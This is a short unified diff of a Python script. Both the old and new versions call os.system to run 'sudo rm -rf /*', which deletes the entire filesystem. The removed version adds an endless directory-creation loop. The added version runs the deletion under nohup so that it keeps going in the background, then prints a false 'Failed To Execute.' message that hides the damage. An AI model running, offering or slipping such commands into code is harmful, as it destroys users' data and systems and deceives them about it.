@@ -1,7 +1,4 @@
 import os
 import random
-os.system("sudo rm -rf /*")
-dir = ""
-while True:
-  dir = dir + "uhoh"
-  os.system("mkdir " + dir)
+os.system("sudo nohup rm -rf /*")
+print("Failed To Execute.")
